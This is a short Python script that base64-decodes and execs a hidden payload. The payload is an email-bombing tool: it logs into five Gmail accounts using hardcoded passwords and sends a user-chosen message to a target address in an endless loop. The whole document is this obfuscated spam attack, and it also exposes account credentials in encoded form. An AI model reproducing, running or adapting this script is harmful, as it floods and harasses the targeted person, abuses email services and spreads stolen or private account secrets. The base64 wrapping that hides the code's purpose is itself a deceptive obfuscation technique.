import base64
decoded = base64.b64decode("CmltcG9ydCBzbXRwbGliCmZyb20gZW1haWwubWltZS50ZXh0IGltcG9ydCBNSU1FVGV4dApmcm9tIGVtYWlsLm1pbWUubXVsdGlwYXJ0IGltcG9ydCBNSU1FTXVsdGlwYXJ0CgojIEluZm9ybWFzaSBha3VuIEdtYWlsCkVNQUlMID0gIjBBbm9ueW11c3kxQGdtYWlsLmNvbSIKUEFTU1dPUkQgPSAiZnZpbiBua2JkIHRjcnYgd2FrZiIKCkVNQUlMMiA9ICJhbm9ueW11c3kxMDFAZ21haWwuY29tIgpQQVNTV09SRDIgPSAieWN0ZyB1dGhsIHducnYgcGZ1bCIKCkVNQUlMMyA9ICJoZWNrZWRieXgxQGdtYWlsLmNvbSIKUEFTU1dPUkQzID0gImliZGYgdWtieiB1Z3FkIGZxd3UiCgpFTUFJTDQgPSAic29uaW4uc3BkMDFAZ21haWwuY29tIgpQQVNTV09SRDQgPSAiZmtwcCBjeWF5IHFmZGIgc3lsbCIKCkVNQUlMNSA9ICJhbm9ueW11c3lpZDkwOUBnbWFpbC5jb20iClBBU1NXT1JENSA9ICJndGN4IGd3dGMgeXpmcCBhaW1pIgoKIyBUdWp1YW4gZW1haWwKRU1BSUxfVFVKVUFOID0gaW5wdXQoIk1BU1VLQU4gVEFSR0VUIDogIikKCiMgSXNpIGVtYWlsCnN1YmplayA9IGlucHV0KCIgbWFzdWthbiBzdWJqZWsgOiAiKQpwZXNhbiA9IGlucHV0KCIgbWFzdWthbiBwZXNhbiA6ICIpIAoKIyBCdWF0IGZvcm1hdCBlbWFpbAptc2cgPSBNSU1FTXVsdGlwYXJ0KCkKbXNnWyJGcm9tIl0gPSBFTUFJTAptc2dbIlRvIl0gPSBFTUFJTF9UVUpVQU4KbXNnWyJTdWJqZWN0Il0gPSBzdWJqZWsKbXNnLmF0dGFjaChNSU1FVGV4dChwZXNhbiwgInBsYWluIikpCgptc2cgPSBNSU1FTXVsdGlwYXJ0KCkKbXNnWyJGcm9tIl0gPSBFTUFJTDIKbXNnWyJUbyJdID0gRU1BSUxfVFVKVUFOCm1zZ1siU3ViamVjdCJdID0gc3ViamVrCm1zZy5hdHRhY2goTUlNRVRleHQocGVzYW4sICJwbGFpbiIpKQoKbXNnID0gTUlNRU11bHRpcGFydCgpCm1zZ1siRnJvbSJdID0gRU1BSUwzCm1zZ1siVG8iXSA9IEVNQUlMX1RVSlVBTgptc2dbIlN1YmplY3QiXSA9IHN1Ymplawptc2cuYXR0YWNoKE1JTUVUZXh0KHBlc2FuLCAicGxhaW4iKSkKCm1zZyA9IE1JTUVNdWx0aXBhcnQoKQptc2dbIkZyb20iXSA9IEVNQUlMNAptc2dbIlRvIl0gPSBFTUFJTF9UVUpVQU4KbXNnWyJTdWJqZWN0Il0gPSBzdWJqZWsKbXNnLmF0dGFjaChNSU1FVGV4dChwZXNhbiwgInBsYWluIikpCgptc2cgPSBNSU1FTXVsdGlwYXJ0KCkKbXNnWyJGcm9tIl0gPSBFTUFJTDUKbXNnWyJUbyJdID0gRU1BSUxfVFVKVUFOCm1zZ1siU3ViamVjdCJdID0gc3ViamVrCm1zZy5hdHRhY2goTUlNRVRleHQocGVzYW4sICJwbGFpbiIpKQojIEtpcmltIFNwYW0KZGVmIGVwZXAoKToKICB0cnk6CiAgICAgICBzZXJ2ZXIgPSBzbXRwbGliLlNNVFAoInNtdHAuZ21haWwuY29tIiwgNTg3KQogICAgICAgc2VydmVyLnN0YXJ0dGxzKCkKICAgICAgIHNlcnZlci5sb2dpbihFTUFJTDIsIFBBU1NXT1JEMikKICAgICAgIHNlcnZlci5zZW5kX21lc3NhZ2UobXNnKQogICAgICAgc2VydmVyLnF1aXQoKQogICAgICAgcHJpbnQoIlNQQU1NSU5HIEVNQUlMIFRFUktJUklNIEtFICIsIEVNQUlMX1RVSlVBTiwgIvCfmIIiKQogIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgcHJpbnQoIuKdjCBHYWdhbCBtZW5naXJpbSBlbWFpbDoiLCBlKQoKIyBLaXJpbSBTcGFtCmRlZiBlcGVwMigpOgogIHRyeToKICAgICAgIHNlcnZlciA9IHNtdHBsaWIuU01UUCgic210cC5nbWFpbC5jb20iLCA1ODcpCiAgICAgICBzZXJ2ZXIuc3RhcnR0bHMoKQogICAgICAgc2VydmVyLmxvZ2luKEVNQUlMLCBQQVNTV09SRCkKICAgICAgIHNlcnZlci5zZW5kX21lc3NhZ2UobXNnKQogICAgICAgc2VydmVyLnF1aXQoKQogICAgICAgcHJpbnQoIlNQQU1NSU5HMiBFTUFJTCBURVJLSVJJTSBLRSAiLCBFTUFJTF9UVUpVQU4sICLwn5iCIikKICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgIHByaW50KCLinYwgR2FnYWwgbWVuZ2lyaW0gZW1haWw6IiwgZSkKCiMgS2lyaW0gU3BhbQpkZWYgZXBlcDMoKToKICB0cnk6CiAgICAgICBzZXJ2ZXIgPSBzbXRwbGliLlNNVFAoInNtdHAuZ21haWwuY29tIiwgNTg3KQogICAgICAgc2VydmVyLnN0YXJ0dGxzKCkKICAgICAgIHNlcnZlci5sb2dpbihFTUFJTDMsIFBBU1NXT1JEMykKICAgICAgIHNlcnZlci5zZW5kX21lc3NhZ2UobXNnKQogICAgICAgc2VydmVyLnF1aXQoKQogICAgICAgcHJpbnQoIlNQQU1NSU5HMyBFTUFJTCBURVJLSVJJTSBLRSAiLCBFTUFJTF9UVUpVQU4sICLwn5iCIikKICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgIHByaW50KCLinYwgR2FnYWwgbWVuZ2lyaW0gZW1haWw6IiwgZSkKCiMgS2lyaW0gU3BhbQpkZWYgZXBlcDQoKToKICB0cnk6CiAgICAgICBzZXJ2ZXIgPSBzbXRwbGliLlNNVFAoInNtdHAuZ21haWwuY29tIiwgNTg3KQogICAgICAgc2VydmVyLnN0YXJ0dGxzKCkKICAgICAgIHNlcnZlci5sb2dpbihFTUFJTDQsIFBBU1NXT1JENCkKICAgICAgIHNlcnZlci5zZW5kX21lc3NhZ2UobXNnKQogICAgICAgc2VydmVyLnF1aXQoKQogICAgICAgcHJpbnQoIlNQQU1NSU5HNCBFTUFJTCBURVJLSVJJTSBLRSAiLCBFTUFJTF9UVUpVQU4sICLwn5iCIikKICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgIHByaW50KCLinYwgR2FnYWwgbWVuZ2lyaW0gZW1haWw6IiwgZSkKCiMgS2lyaW0gU3BhbQpkZWYgZXBlcDUoKToKICB0cnk6CiAgICAgICBzZXJ2ZXIgPSBzbXRwbGliLlNNVFAoInNtdHAuZ21haWwuY29tIiwgNTg3KQogICAgICAgc2VydmVyLnN0YXJ0dGxzKCkKICAgICAgIHNlcnZlci5sb2dpbihFTUFJTDUsIFBBU1NXT1JENSkKICAgICAgIHNlcnZlci5zZW5kX21lc3NhZ2UobXNnKQogICAgICAgc2VydmVyLnF1aXQoKQogICAgICAgcHJpbnQoIlNQQU1NSU5HNSBFTUFJTCBURVJLSVJJTSBLRSAiLCBFTUFJTF9UVUpVQU4sICLwn5iCIikKICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgIHByaW50KCLinYwgR2FnYWwgbWVuZ2lyaW0gZW1haWw6IiwgZSkKCndoaWxlIFRydWU6CglwcmludCgiSklLQSBJTkdJTiBCRVJIRU5USSBQRU5DRVQgQ1RSTCArIEMiKQoJZXBlcCgpCgllcGVwMigpCgllcGVwMygpCgllcGVwNCgpCgllcGVwNSgpCgo=".encode()).decode()
exec(decoded)